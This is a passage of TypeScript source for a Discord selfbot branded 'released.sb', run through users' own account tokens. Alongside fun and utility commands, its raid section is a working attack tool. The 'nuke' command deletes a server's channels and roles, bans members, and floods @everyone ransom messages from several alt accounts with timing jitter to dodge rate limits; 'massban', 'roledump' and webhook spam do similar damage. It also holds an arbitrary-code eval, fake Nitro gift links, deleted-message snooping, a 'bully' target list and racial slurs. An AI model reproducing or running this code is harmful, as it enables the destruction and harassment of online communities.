                                 `> \`${prefix}help\` to show the menu\n` +
                                 `> \`${prefix}txt\` - Switches your help menu to Text Mode (help menu)\n` +
                                 `> \`${prefix}img\` - Switches your help menu back to Image Mode (help menu)\n\n` +
                                 `> To Control Stuff Go To The Dashboard And Login\n\n` +
                                 `> [Release.Sb](https://release-sb.onrender.com)`;
                
                await message.channel.send(response).catch(() => {});
                addLog(targetToken, `Account hosted via .host command by ${message.author.tag}`);
            } catch (e: any) {
                await message.channel.send(`❌ Failed to host account: ${e.message}`).catch(() => {});
            }
            return;
        }

        // Whitelist Check
        const allowedUsers = whitelistedUsers.get(token) || new Set();
        const isOwner = message.author.id === client.user?.id;
        const isWhitelisted = allowedUsers.has(message.author.id);

        if (!isOwner && !isWhitelisted) return;

        // --- Command Implementation ---

        // 1. Main
        if (command === 'prefix') {
            await message.delete().catch(() => {});
            const newPrefix = args[0];
            if (newPrefix) {
                prefixes.set(token, newPrefix);
                addLog(token, `Prefix changed to: ${newPrefix}`);
                await message.channel.send(`Prefix set to \`${newPrefix}\``).catch(() => {});
            }
        }

        if (command === 'settoken') {
            await message.delete().catch(() => {});
            const newToken = args[0];
            if (newToken && isOwner) {
                addLog(token, `Token update requested.`);
                await message.channel.send('Token update requested. Please use the dashboard for security.').catch(() => {});
            }
        }

        if (command === 'reload') {
            await message.delete().catch(() => {});
            if (isOwner) {
                addLog(token, 'Reloading client...');
                await message.channel.send('Reloading...').catch(() => {});
                client.destroy();
                activeClients.delete(token);
                await getClient(token);
            }
        }

        if (command === 'eval') {
            await message.delete().catch(() => {});
            if (!isOwner) return;
            const code = args.join(' ');
            try {
                // eslint-disable-next-line no-eval
                let evaled = eval(code);
                if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                await message.channel.send(`\`\`\`js\n${evaled.substring(0, 1900)}\n\`\`\``).catch(() => {});
            } catch (err) {
                await message.channel.send(`\`\`\`js\n${err}\n\`\`\``).catch(() => {});
            }
        }

        if (command === 'ping') {
            await message.delete().catch(() => {});
            const startTime = Date.now();
            const msg = await message.channel.send('Pinging...').catch(() => {});
            if (msg) {
                const latency = Date.now() - startTime;
                const apiLatency = Math.round(client.ws.ping);
                await msg.edit(`🏓 **Pong!**\nLatency: \`${latency}ms\`\nAPI: \`${apiLatency}ms\``).catch(() => {});
            }
        }

        if (command === 'info') {
            await message.delete().catch(() => {});
            const info = `
**Selfbot Info**
User: ${client.user?.tag}
ID: ${client.user?.id}
Guilds: ${client.guilds.cache.size}
Node: ${process.version}
            `;
            await message.channel.send(info).catch(() => {});
        }

        // 3. Multi-Feature Commands
        if (command === 'tton') {
            await message.delete().catch(() => {});
            const enabled = !multiFeatureEnabled.get(token);
            multiFeatureEnabled.set(token, enabled);
            await message.channel.send(`Multi-Feature mode: \`${enabled ? 'ON' : 'OFF'}\``).catch(() => {});
        }

        if (command === 'txt') {
            await message.delete().catch(() => {});
            menuMode.set(token, 'text');
            await message.channel.send(`Menu mode set to: \`TEXT\``).catch(() => {});
        }

        if (command === 'img') {
            await message.delete().catch(() => {});
            menuMode.set(token, 'image');
            await message.channel.send(`Menu mode set to: \`IMAGE\``).catch(() => {});
        }

        if (command === 'mock') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (!text) return;
            const mocked = text.split('').map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join('');
            await message.channel.send(mocked).catch(() => {});
        }

        if (command === 'reverse') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (!text) return;
            await message.channel.send(text.split('').reverse().join('')).catch(() => {});
        }

        if (command === 'copypasta') {
            await message.delete().catch(() => {});
            const pastas = [
                "I sexually Identify as an Attack Helicopter. Ever since I was a boy I dreamed of soaring over the oilfields dropping hot sticky loads on disgusting foreigners.",
                "What the fuck did you just fucking say about me, you little bitch? I'll have you know I graduated top of my class in the Navy Seals...",
                "The FitnessGram™ Pacer Test is a multistage aerobic capacity test that progressively gets more difficult as it continues."
            ];
            await message.channel.send(pastas[Math.floor(Math.random() * pastas.length)]).catch(() => {});
        }

        if (command === 'nitro') {
            await message.delete().catch(() => {});
            await message.channel.send('https://discord.gift/' + Math.random().toString(36).substring(2, 18)).catch(() => {});
        }

        if (command === 'cat') {
            await message.delete().catch(() => {});
            try {
                const res = await fetch('https://api.thecatapi.com/v1/images/search');
                const json = await res.json();
                await message.channel.send(json[0].url).catch(() => {});
            } catch (e) {}
        }

        if (command === 'dog') {
            await message.delete().catch(() => {});
            try {
                const res = await fetch('https://dog.ceo/api/breeds/image/random');
                const json = await res.json();
                await message.channel.send(json.message).catch(() => {});
            } catch (e) {}
        }

        if (command === 'fox') {
            await message.delete().catch(() => {});
            try {
                const res = await fetch('https://randomfox.ca/floof/');
                const json = await res.json();
                await message.channel.send(json.image).catch(() => {});
            } catch (e) {}
        }

        // New Fun/Text Commands
        if (command === 'clap') {
            await message.delete().catch(() => {});
            const text = args.join(' 👏 ');
            if (text) await message.channel.send(`👏 ${text} 👏`).catch(() => {});
        }
        if (command === 'shrug') {
            await message.delete().catch(() => {});
            await message.channel.send(args.join(' ') + ' ¯\\_(ツ)_/¯').catch(() => {});
        }
        if (command === 'tableflip') {
            await message.delete().catch(() => {});
            await message.channel.send(args.join(' ') + ' (╯°□°）╯︵ ┻━┻').catch(() => {});
        }
        if (command === 'unflip') {
            await message.delete().catch(() => {});
            await message.channel.send(args.join(' ') + ' ┬─┬ ノ( ゜-゜ノ)').catch(() => {});
        }
        if (command === 'lenny') {
            await message.delete().catch(() => {});
            await message.channel.send(args.join(' ') + ' ( ͡° ͜ʖ ͡°)').catch(() => {});
        }
        if (command === 'bold') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) await message.channel.send(`**${text}**`).catch(() => {});
        }
        if (command === 'italic') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) await message.channel.send(`*${text}*`).catch(() => {});
        }
        if (command === 'strike') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) await message.channel.send(`~~${text}~~`).catch(() => {});
        }
        if (command === 'spoiler') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) await message.channel.send(`||${text}||`).catch(() => {});
        }
        if (command === 'code') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) await message.channel.send(`\`${text}\``).catch(() => {});
        }
        if (command === 'block') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) await message.channel.send(`\`\`\`${text}\`\`\``).catch(() => {});
        }
        if (command === 'jvc') {
            await message.delete().catch(() => {});
            const channelId = args[0];
            if (channelId) {
                const clientsToUse = (multiFeatureEnabled.get(token) ?? true) ? (altClients.get(token) || []) : [client];
                
                for (const c of clientsToUse) {
                    const channel = c.channels.cache.get(channelId) || await c.channels.fetch(channelId).catch(() => null);
                    if (channel && channel.isVoiceBased()) {
                        joinVoiceChannel({
                            channelId: channel.id,
                            guildId: channel.guild.id,
                            adapterCreator: channel.guild.voiceAdapterCreator,
                        });
                    }
                }
                await message.channel.send(`Joined ${clientsToUse.length} clients to ${channelId}`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000));
            } else {
                await message.channel.send(`Usage: .jvc <channel_id>`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000));
            }
        }
        if (command === 'quote') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) await message.channel.send(`> ${text}`).catch(() => {});
        }
        if (command === 'coinflip') {
            await message.delete().catch(() => {});
            const result = Math.random() > 0.5 ? 'Heads' : 'Tails';
            await message.channel.send(`🪙 ${result}`).catch(() => {});
        }
        if (command === 'dice') {
            await message.delete().catch(() => {});
            const result = Math.floor(Math.random() * 6) + 1;
            await message.channel.send(`🎲 ${result}`).catch(() => {});
        }
        if (command === 'slap') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first();
            if (user) await message.channel.send(`👋 Slapped ${user.tag}!`).catch(() => {});
        }
        if (command === 'hug') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first();
            if (user) await message.channel.send(`🫂 Hugged ${user.tag}!`).catch(() => {});
        }
        if (command === 'kiss') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first();
            if (user) await message.channel.send(`💋 Kissed ${user.tag}!`).catch(() => {});
        }
        if (command === 'pat') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first();
            if (user) await message.channel.send(`💆 Patted ${user.tag}!`).catch(() => {});
        }
        if (command === 'kill') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first();
            if (user) await message.channel.send(`🔪 Killed ${user.tag}!`).catch(() => {});
        }

        if (command === 'bully') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first();
            if (user) {
                let set = bullyList.get(token);
                if (!set) {
                    set = new Set();
                    bullyList.set(token, set);
                }
                
                if (set.has(user.id)) {
                    set.delete(user.id);
                    await message.channel.send(`Stopped bullying ${user.tag}`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000));
                } else {
                    set.add(user.id);
                    await message.channel.send(`Started bullying ${user.tag}`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000));
                }
            } else {
                 await message.channel.send(`Usage: .bully @user`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000));
            }
        }


        // 3. Utility
        if (command === 'snipe') {
            await message.delete().catch(() => {});
            const slot = parseInt(args[0]) || 1;
            const userDeletes = deletedMessages.get(token);
            const snipedHistory = userDeletes?.get(message.channel.id);
            const sniped = snipedHistory ? snipedHistory[slot - 1] : null;

            if (sniped) {
                const info = `**Sniped Message (Slot ${slot})**\nAuthor: ${sniped.author} (${sniped.authorId})\nContent: ${sniped.content || '[No Text]'}\nTime: ${sniped.timestamp.toLocaleTimeString()}`;
                await message.channel.send(info).catch(() => {});
                if (sniped.attachments.length > 0) {
                    await message.channel.send(sniped.attachments.join('\n')).catch(() => {});
                }
            } else {
                await message.channel.send(`No deleted message found for slot ${slot} in this channel.`).catch(() => {});
            }
        }

        if (command === 'avatar') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first() || client.user;
            if (user) {
                await message.channel.send(user.displayAvatarURL({ dynamic: true, size: 4096 })).catch(() => {});
            }
        }

        if (command === 'serverinfo') {
            await message.delete().catch(() => {});
            if (message.guild) {
                const g = message.guild;
                const info = `
**Server Info**
Name: ${g.name}
ID: ${g.id}
Members: ${g.memberCount}
Owner: <@${g.ownerId}>
Created: ${g.createdAt.toLocaleDateString()}
                `;
                await message.channel.send(info).catch(() => {});
            }
        }

        if (command === 'userinfo' || command === 'token' || command === 'whois') { 
             await message.delete().catch(() => {});
             const user = message.mentions.users.first() || client.user;
             if (user) {
                 const info = `
**User Info**
Tag: ${user.tag}
ID: ${user.id}
Created: ${user.createdAt.toLocaleDateString()}
Avatar: ${user.displayAvatarURL()}
                 `;
                 await message.channel.send(info).catch(() => {});
             }
        }
        
        if (command === 'typing') {
            await message.delete().catch(() => {});
            const seconds = parseInt(args[0]) || 10;
            message.channel.sendTyping().catch(() => {});
            // Keep typing
            const interval = setInterval(() => {
                message.channel.sendTyping().catch(() => {});
            }, 9000);
            setTimeout(() => clearInterval(interval), seconds * 1000);
        }

        // New Utility Commands
        if (command === 'id') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first() || client.user;
            if (user) await message.channel.send(user.id).catch(() => {});
        }
        if (command === 'createdat') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first() || client.user;
            if (user) await message.channel.send(user.createdAt.toUTCString()).catch(() => {});
        }
        if (command === 'joinedat') {
            await message.delete().catch(() => {});
            const member = message.mentions.members?.first() || message.member;
            if (member) await message.channel.send(member.joinedAt?.toUTCString() || 'Unknown').catch(() => {});
        }
        if (command === 'roles') {
            await message.delete().catch(() => {});
            if (message.member) {
                const roles = message.member.roles.cache.map(r => r.name).join(', ');
                await message.channel.send(`**Roles:** ${roles}`).catch(() => {});
            }
        }
        if (command === 'perms') {
            await message.delete().catch(() => {});
            if (message.member) {
                const perms = message.member.permissions.toArray().join(', ');
                await message.channel.send(`**Permissions:** ${perms}`).catch(() => {});
            }
        }
        if (command === 'uptime') {
            await message.delete().catch(() => {});
            const uptime = Math.floor(client.uptime! / 1000);
            await message.channel.send(`Uptime: ${uptime} seconds`).catch(() => {});
        }
        if (command === 'say') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) await message.channel.send(text).catch(() => {});
        }
        if (command === 'embed') {
            await message.delete().catch(() => {});
            try {
                const json = JSON.parse(args.join(' '));
                await message.channel.send({ embeds: [json] }).catch(() => {});
            } catch (e) {
                await message.channel.send('Invalid JSON').catch(() => {});
            }
        }
        if (command === 'react') {
            await message.delete().catch(() => {});
            const emoji = args[0];
            const count = parseInt(args[1]) || 1;
            if (emoji) {
                const messages = await message.channel.messages.fetch({ limit: count + 1 });
                // Filter out the command message itself if not deleted fast enough
                messages.forEach(m => {
                    if (m.id !== message.id) m.react(emoji).catch(() => {});
                });
            }
        }
        if (command === 'stop') {
            await message.delete().catch(() => {});
            // Placeholder for stopping active loops if we had global state for them
            // For now just clears activity
            // @ts-ignore
            client.user?.setActivity(null);
            await message.channel.send('Stopped activities.').catch(() => {});
        }
        if (command === 'leave') {
            await message.delete().catch(() => {});
            if (message.guild) {
                await message.guild.leave().catch(() => {});
            }
        }
        if (command === 'blockuser') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first();
            if (user) {
                // @ts-ignore
                await client.users.cache.get(user.id)?.block().catch(() => {});
                await message.channel.send(`Blocked ${user.tag}`).catch(() => {});
            }
        }
        if (command === 'unblockuser') {
            await message.delete().catch(() => {});
            const userId = args[0];
            if (userId) {
                 // @ts-ignore
                 await client.users.unblock(userId).catch(() => {});
                 await message.channel.send(`Unblocked ${userId}`).catch(() => {});
            }
        }


        if (command === 'clearselfbot') {
            await message.delete().catch(() => {});
            if (!isOwner) return;
            
            addLog(token, `Executing clearselfbot...`);
            
            // Clear all RPC settings
            rpcSettings.clear();
            await supabase.from('rpc_settings').delete().neq('id', '0');
            
            // Clear rotation timers
            rotationTimers.forEach(timer => clearInterval(timer));
            rotationTimers.clear();
            
            // Clear auto react rules
            autoReactRules.clear();
            await supabase.from('auto_react_rules').delete().neq('id', '0');

            // Clear sessions
            sessions.clear();
            await supabase.from('sessions').delete().neq('id', '0');
            
            activeClients.forEach(c => c.destroy());
            activeClients.clear();
            
            await message.channel.send('Selfbot cleared and reset.').catch(() => {});
        }

        if (command === 'help') {
          try {
            await message.delete().catch(() => {});
            
            const prefix = prefixes.get(token) || '.';
            const mode = menuMode.get(token) || 'image';
            const catNum = parseInt(args[0]);
            
            if (mode === 'text') {
                if (!isNaN(catNum) && HELP_CATEGORIES[catNum]) {
                    const cat = HELP_CATEGORIES[catNum];
                    let helpText = `**${cat.name.toUpperCase()} COMMANDS**\n`;
                    helpText += `\`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\`\n\n`;
                    
                    cat.commands.forEach((cmd: any, index: number) => {
                        const cmdName = cmd.name.startsWith('.') ? prefix + cmd.name.slice(1) : cmd.name;
                        helpText += `> **${index + 1}. ${cmdName}**\n`;
                        helpText += `> \`└─\` *${cmd.desc}*\n\n`;
                    });
                    
                    helpText += `\`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\`\n`;
                    helpText += `\`Page ${catNum}/6\` | \`Prefix: ${prefix}\` | \`v3.0.0\``;
                    await message.channel.send(helpText).catch(() => {});
                } else {
                    const helpHeader = "```ansi\n" +
                                     "Category\u001b[30m: \u001b[34m" + prefix + "help <category> [page]\u001b[0m\n" +
                                     "Commands\u001b[30m: \u001b[34m" + prefix + "help <command>\u001b[0m\n" +
                                     "```";
                    
                    const helpMenu = "```ansi\n" +
                                   "\u001b[1;35m╔════════════════ Release ═════════════╗\u001b[0m\n" +
                                   "\u001b[1;30m║                                    ║\u001b[0m\n" +
                                   "\u001b[0;31m║ Main       \u001b[30m| \u001b[0;31mMain       ║\u001b[0m\n" +
                                   "\u001b[0;33m║ Raid       \u001b[30m| \u001b[0;33mRaid       ║\u001b[0m\n" +
                                   "\u001b[0;32m║ Fun        \u001b[30m| \u001b[0;32mFun        ║\u001b[0m\n" +
                                   "\u001b[0;36m║ Utility    \u001b[30m| \u001b[0;36mUtility    ║\u001b[0m\n" +
                                   "\u001b[0;34m║ Etc        \u001b[30m| \u001b[0;34mEtc        ║\u001b[0m\n" +
                                   "\u001b[0;35m║ Random     \u001b[30m| \u001b[0;35mRandom     ║\u001b[0m\n" +
                                   "\u001b[1;30m║                                    ║\u001b[0m\n" +
                                   "\u001b[1;35m║ Ver\u001b[30m: \u001b[34m3.0.0                        ║\u001b[0m\n" +
                                   "\u001b[1;35m╚════════════════════════════════════╝\u001b[0m\n" +
                                   "```";
                    
                    await message.channel.send(helpHeader).catch(() => {});
                    await message.channel.send(helpMenu).catch(() => {});
                    return;

                }
            } else {
                let buffer;
                const userHelpBg = helpBackgrounds.get(token) || null;
                if (!isNaN(catNum) && HELP_CATEGORIES[catNum]) {
                    buffer = await buildCategoryImage(userHelpBg, catNum);
                } else {
                    buffer = await buildOverviewImage(userHelpBg);
                }
                
                if (buffer) {
                    // @ts-ignore
                    await message.channel.send({
                      files: [{ attachment: buffer, name: 'help.png' }]
                    });
                }
            }
            addLog(token, `Sent help menu in ${message.channel.id}`);
          } catch (e) {
            addLog(token, `Failed to send help menu: ${e}`);
          }
        }

        // --- RAID COMMANDS ---
        
        // Webhook Spam (Requested)
        if (command === 'webhookspam') {
            await message.delete().catch(() => {});
            const count = parseInt(args[1]) || 5;
            const msg = args.slice(2).join(' ') || args[0]; // Handle different arg parsing if needed, assuming .webhookspam <msg> <count> or .webhookspam <count> <msg>
            // Let's stick to .webhookspam <msg> <count> based on user request "webhookspam <msg> <number>"
            // Actually user said "webhookspam <msg> <number>"
            // So args[0] is msg (first word), args[1] is number? Or msg can be multiple words?
            // Usually it's .webhookspam <count> <msg> for easier parsing.
            // Let's try to parse last arg as number.
            
            let spamCount = 5;
            let spamMsg = "Spam";
            
            const lastArg = args[args.length - 1];
            if (!isNaN(parseInt(lastArg))) {
                spamCount = parseInt(lastArg);
                spamMsg = args.slice(0, -1).join(' ');
            } else {
                spamMsg = args.join(' ');
            }

            if (message.guild && message.channel.type === 'GUILD_TEXT') {
                try {
                    // @ts-ignore
                    const webhook = await message.channel.createWebhook('Spammer', {
                        avatar: client.user?.displayAvatarURL()
                    });
                    
                    for (let i = 0; i < spamCount; i++) {
                        await webhook.send(spamMsg);
                        await new Promise(r => setTimeout(r, 200)); // Rate limit safety
                    }
                    
                    await webhook.delete();
                } catch (e) {
                    addLog(token, `Webhook spam failed: ${e}`);
                }
            }
        }

        if (command === 'antinuke') {
            await message.delete().catch(() => {});
            const guildId = args[0] || message.guild?.id;
            if (!guildId) return;
            
            let guildsSet = antiNukeGuilds.get(token);
            if (!guildsSet) {
                guildsSet = new Set();
                antiNukeGuilds.set(token, guildsSet);
            }
            
            if (guildsSet.has(guildId)) {
                guildsSet.delete(guildId);
                addLog(token, `Disabled Anti-Nuke for guild ${guildId}`);
            } else {
                guildsSet.add(guildId);
                addLog(token, `Enabled Anti-Nuke for guild ${guildId}`);
            }
        }

        if (command === 'spam') {
            await message.delete().catch(() => {});
            const count = parseInt(args[0]);
            const msg = args.slice(1).join(' ');
            if (count && msg) {
                for (let i = 0; i < count; i++) {
                    message.channel.send(msg).catch(() => {});
                    await new Promise(r => setTimeout(r, 200)); // Slight delay
                }
            }
        }

        if (command === 'wl') {
            await message.delete().catch(() => {});
            if (!isOwner) return; // Only owner can whitelist
            const user = message.mentions.users.first();
            if (user) {
                const current = whitelistedUsers.get(token) || new Set();
                current.add(user.id);
                whitelistedUsers.set(token, current);
                await message.channel.send(`Whitelisted ${user.tag}`).catch(() => {});
            }
        }

        if (command === 'unwl') {
            await message.delete().catch(() => {});
            if (!isOwner) return;
            const user = message.mentions.users.first();
            if (user) {
                const current = whitelistedUsers.get(token);
                if (current) {
                    current.delete(user.id);
                    await message.channel.send(`Unwhitelisted ${user.tag}`).catch(() => {});
                }
            }
        }

        if (command === 'nuke' || command === 'spam') {
            await message.delete().catch(() => {});
            if (message.guild) {
                const guild = message.guild;
                const delay = parseInt(args[0]) || 1500;
                let customMsg = args.slice(1).join(' ');
                const defaultMsg = `@everyone server have been raided by released.sb was made by Harumi join this server https://discord.gg/7jUMex6NRk if you want your server to be restored please DM these owners "<@1413100448482857081>" or DM the co owner: "<@1462523761302437889>"\n\nIf you wanna join Our official discord server here it is: https://discord.gg/3AJXzYKzQ`;
                const spamMsg = customMsg || defaultMsg;
                const name = customMsg ? customMsg.substring(0, 32) : 'cucked by released.sb';
                const alts = altClients.get(token) || [];
                const allSpammers = [client, ...alts];

                activeNukes.set(token, true);
                addLog(token, `${command.toUpperCase()} started on ${guild.name} with ${allSpammers.length} accounts.`);

                // If it's a nuke, try the high-perm actions first
                if (command === 'nuke') {
                    // Backup
                    serverBackups.set(guild.id, {
                        name: guild.name,
                        icon: guild.iconURL(),
                        channels: guild.channels.cache.map(c => ({ name: c.name, type: c.type, position: 'position' in c ? c.position : 0 })),
                        roles: guild.roles.cache.map(r => ({ name: r.name, color: r.color, permissions: r.permissions, position: r.position }))
                    });

                    // Rename Server
                    await guild.setName(name).catch(() => {});

                    // Helper for jittered execution
                    const executeWithJitter = async (tasks: any[], action: (task: any, client: Client) => Promise<void>) => {
                        let clientIdx = 0;
                        for (const task of tasks) {
                            if (!activeNukes.get(token)) break;
                            const currentClient = allSpammers[clientIdx % allSpammers.length];
                            clientIdx++;
                            action(task, currentClient).catch(() => {});
                            const jitter = Math.random() * 500;
                            await new Promise(r => setTimeout(r, delay + jitter));
                        }
                    };

                    // Delete Channels
                    executeWithJitter(Array.from(guild.channels.cache.values()), async (c, currentClient) => {
                        const fetchGuild = await currentClient.guilds.fetch(guild.id).catch(() => null);
                        if (fetchGuild) {
                            const fetchChannel = fetchGuild.channels.cache.get(c.id);
                            if (fetchChannel) await fetchChannel.delete().catch(() => {});
                        }
                    });

                    // Delete Roles
                    const roles = Array.from(guild.roles.cache.values()).filter(r => !r.managed && r.name !== '@everyone');
                    executeWithJitter(roles, async (r, currentClient) => {
                        const fetchGuild = await currentClient.guilds.fetch(guild.id).catch(() => null);
                        if (fetchGuild) {
                            const fetchRole = fetchGuild.roles.cache.get(r.id);
                            if (fetchRole) await fetchRole.delete().catch(() => {});
                        }
                    });

                    // Create Channels & Roles
                    const createTasks = Array.from({ length: 50 });
                    executeWithJitter(createTasks, async (_, currentClient) => {
                        const fetchGuild = await currentClient.guilds.fetch(guild.id).catch(() => null);
                        if (fetchGuild) {
                            const ch = await fetchGuild.channels.create(name, { type: 'GUILD_TEXT' }).catch(() => null);
                            if (ch && ch.isText()) {
                                // @ts-ignore
                                ch.send(spamMsg).catch(() => {});
                            }
                            await fetchGuild.roles.create({ name: name, color: 'RED' }).catch(() => null);
                        }
                    });
                    
                    // Ban Members
                    const members = Array.from(guild.members.cache.values()).filter(m => m.id !== client.user?.id && m.bannable);
                    executeWithJitter(members, async (m, currentClient) => {
                        const fetchGuild = await currentClient.guilds.fetch(guild.id).catch(() => null);
                        if (fetchGuild) {
                            const fetchMember = fetchGuild.members.cache.get(m.id);
                            if (fetchMember) await fetchMember.ban({ reason: 'cucked by released.sb' }).catch(() => {});
                        }
                    });
                }

                // --- Mass Spam Fallback (Works for both .nuke and .spam) ---
                const visibleChannels = Array.from(guild.channels.cache.values()).filter(c => c.isText());
                
                visibleChannels.forEach(async (channel) => {
                    if (!channel.isText()) return;
                    if (!activeNukes.get(token)) return;

                    // 1. Try Webhook Spam first
                    try {
                        // @ts-ignore
                        const webhooks = await channel.fetchWebhooks().catch(() => null);
                        let webhook = webhooks?.first();
                        // @ts-ignore
                        if (!webhook) webhook = await channel.createWebhook('Harumi', { avatar: 'https://i.imgur.com/p2qNFag.jpeg' }).catch(() => null);
                        
                        if (webhook) {
                            allSpammers.forEach(async (spammer, idx) => {
                                setTimeout(async () => {
                                    for (let i = 0; i < 100; i++) {
                                        if (!activeNukes.get(token)) break;
                                        // @ts-ignore
                                        await webhook.send({ content: spamMsg, username: 'Harumi', avatarURL: 'https://i.imgur.com/p2qNFag.jpeg' }).catch(() => {});
                                        await new Promise(r => setTimeout(r, 250));
                                    }
                                }, idx * 50);
                            });
                            return;
                        }
                    } catch (e) {}

                    // 2. Fallback to Normal Message Spam
                    allSpammers.forEach(async (spammer, idx) => {
                        setTimeout(async () => {
                            try {
                                const fetchGuild = await spammer.guilds.fetch(guild.id).catch(() => null);
                                if (!fetchGuild) return;
                                const fetchChannel = fetchGuild.channels.cache.get(channel.id);
                                if (fetchChannel && fetchChannel.isText()) {
                                    for (let i = 0; i < 100; i++) {
                                        if (!activeNukes.get(token)) break;
                                        // @ts-ignore
                                        await fetchChannel.send(spamMsg).catch(() => {});
                                        await new Promise(r => setTimeout(r, 1000));
                                    }
                                }
                            } catch (e) {}
                        }, idx * 200);
                    });
                });
            }
        }

        if (command === 'stop') {
            await message.delete().catch(() => {});
            activeNukes.set(token, false);
            addLog(token, 'Nuke/Spam process stopped.');
            await message.channel.send('🛑 **Process Stopped.**').then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
        }

        if (command === 'rss') {
            await message.delete().catch(() => {});
            // Restriction: Owner (self) or specific IDs
            const allowedIDs = ['1413100448482857081', '1462523761302437889', client.user?.id];
            if (!allowedIDs.includes(message.author.id)) return;

            if (message.guild) {
                const guild = message.guild;
                const backup = serverBackups.get(guild.id);
                if (!backup) {
                    await message.channel.send('No backup found for this server.').catch(() => {});
                    return;
                }

                // Restore Name
                await guild.setName(backup.name).catch(() => {});
                if (backup.icon) await guild.setIcon(backup.icon).catch(() => {});

                // Delete Current Channels (Nuked ones)
                // We specifically target the nuke name to be safe, or just all if we trust the backup
                const nukeName = 'cucked-by-released-sb-fuck-you-all-niggas-harumi-on-top';
                const nukeRoleName = 'cucked by released.sb fuck you all niggas Harumi on top';

                // Delete channels matching nuke name OR all channels if we are doing a full restore
                // Let's delete ALL channels to be sure we are restoring to clean state
                const channels = await guild.channels.fetch();
                for (const [id, c] of channels) {
                    await c.delete().catch(() => {});
                }

                // Delete roles matching nuke name
                const roles = await guild.roles.fetch();
                for (const [id, r] of roles) {
                    if (r.name === nukeRoleName || r.name === '@everyone') continue;
                    // Also delete if it looks like a nuke role
                    if (r.name.includes('cucked by released.sb')) {
                        await r.delete().catch(() => {});
                    }
                }

                // Restore Channels
                for (const c of backup.channels) {
                    try {
                        await guild.channels.create(c.name, { type: c.type });
                        // No wait here for speed, or minimal
                    } catch (e) {}
                }

                // Restore Roles
                for (const r of backup.roles) {
                    if (r.name === '@everyone') continue;
                    try {
                        await guild.roles.create({
                            name: r.name,
                            color: r.color,
                            permissions: r.permissions,
                            reason: 'Server Restore'
                        });
                    } catch (e) {}
                }
                
                // Send success in a new channel
                const ch = await guild.channels.create('restored', { type: 'GUILD_TEXT' });
                ch.send('Server restored successfully.').catch(() => {});
            }
        }

        if (command === 'massban') {
            await message.delete().catch(() => {});
            if (message.guild) {
                const members = await message.guild.members.fetch();
                members.forEach(m => {
                    if (m.bannable) m.ban({ reason: 'Nuked' }).catch(() => {});
                });
            }
        }
        
        // New Raid/Mod Commands
        if (command === 'kick') {
            await message.delete().catch(() => {});
            const user = message.mentions.members?.first();
            if (user && user.kickable) {
                await user.kick('Selfbot Kick').catch(() => {});
            }
        }
        if (command === 'ban') {
            await message.delete().catch(() => {});
            const user = message.mentions.members?.first();
            if (user && user.bannable) {
                await user.ban({ reason: 'Selfbot Ban' }).catch(() => {});
            }
        }
        if (command === 'timeout') {
            await message.delete().catch(() => {});
            const user = message.mentions.members?.first();
            const time = parseInt(args[1]) || 60; // seconds
            if (user) {
                // @ts-ignore
                await user.timeout(time * 1000, 'Selfbot Timeout').catch(() => {});
            }
        }
        if (command === 'slowmode') {
            await message.delete().catch(() => {});
            const time = parseInt(args[0]) || 0;
            if (message.channel.type === 'GUILD_TEXT') {
                // @ts-ignore
                await message.channel.setRateLimitPerUser(time).catch(() => {});
            }
        }
        if (command === 'lock') {
            await message.delete().catch(() => {});
            if (message.guild && message.channel.type === 'GUILD_TEXT') {
                // @ts-ignore
                await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SEND_MESSAGES: false });
            }
        }
        if (command === 'unlock') {
            await message.delete().catch(() => {});
            if (message.guild && message.channel.type === 'GUILD_TEXT') {
                // @ts-ignore
                await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SEND_MESSAGES: true });
            }
        }


        if (command === 'adminrole') {
            await message.delete().catch(() => {});
            if (message.guild) {
                try {
                    const role = await message.guild.roles.create({
                        name: 'Admin',
                        color: 'RED',
                        permissions: ['ADMINISTRATOR'],
                        reason: 'Selfbot Admin Role'
                    });
                    // @ts-ignore
                    await message.member?.roles.add(role);
                } catch (e) {
                    // ignore
                }
            }
        }

        if (command === 'rename') {
            await message.delete().catch(() => {});
            const name = args.join(' ');
            if (message.guild && name) {
                message.guild.channels.cache.forEach(ch => ch.setName(name).catch(() => {}));
            }
        }

        if (command === 'roledump') {
            await message.delete().catch(() => {});
            if (message.guild) {
                message.guild.roles.cache.forEach(r => {
                    if (r.editable && r.name !== '@everyone') r.delete().catch(() => {});
                });
            }
        }

        if (command === 'snipe') {
            await message.delete().catch(() => {});
            const userDeletes = deletedMessages.get(token);
            if (!userDeletes || !userDeletes.has(message.channel.id)) {
                await message.channel.send('No messages to snipe!').catch(() => {});
                return;
            }
            const msg = userDeletes.get(message.channel.id);
            await message.channel.send(`**${msg.author.tag}**: ${msg.content}`).catch(() => {});
        }

        if (command === 'avatar') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first() || message.author;
